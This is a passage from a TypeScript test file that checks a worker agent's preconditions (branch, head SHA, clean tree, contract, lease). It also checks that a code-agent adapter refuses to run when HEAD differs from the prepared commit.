    expect(checkWorkerPreconditions({ ...base, status: { ...s.status(), branch: "main" } }).ok).toBe(false);
    expect(checkWorkerPreconditions({ ...base, status: { ...s.status(), branch: "HEAD" } }).ok).toBe(false);
    expect(checkWorkerPreconditions({ ...base, status: { ...s.status(), headSha: MOVED } }).ok).toBe(false);
    expect(checkWorkerPreconditions({ ...base, status: { ...s.status(), dirtyPaths: ["x.ts"] } }).ok).toBe(false);
    expect(checkWorkerPreconditions({ ...base, prepared: { ...p } }).ok).toBe(false);
    expect(checkWorkerPreconditions({ ...base, contract: { ...contract, branch: "agent/task-t1-other" } }).ok).toBe(false);
    expect(checkWorkerPreconditions({ ...base, contract: { ...contract, expectedHeadSha: MOVED } }).ok).toBe(false);
    expect(checkWorkerPreconditions({ ...base, plan: { ...plan } }).ok).toBe(false);
    s.leases.release(s.lease);
    expect(checkWorkerPreconditions(base).ok).toBe(false);
  });

  it("the worker refuses a bound contract if HEAD differs from the prepared SHA", async () => {
    const { plan, s, prepared: p, contract } = await prepared();
    const gate = checkWorkerPreconditions({ prepared: p, plan, contract, status: s.status(), metadataDigest: FAKE_GIT_METADATA_DIGEST, leases: s.leases, lease: s.lease });
    if (!gate.ok) throw new Error(gate.reason);
    const runner = createFakeRunner(() => ({ exit: { stdout: "" } }));
    const git = createFakeGit([{ branch: NEW_BRANCH, headSha: MOVED, dirtyPaths: [] }], []);
    const adapter = createClaudeCodeAdapter({ model: "claude-opus-5-5", repoRoot: ROOT, timeoutMs: 60_000 }, { runner, git, promptFiles: createFakePromptFiles(), timer: createFakeTimer() });
    const result = await adapter.start({ contract: gate.contract, now: "2026-10-04T00:00:00.000Z" }).result;
    expect(result.errorType).toBe("branch_mismatch");
    expect(runner.specs).toHaveLength(0);
  });
});
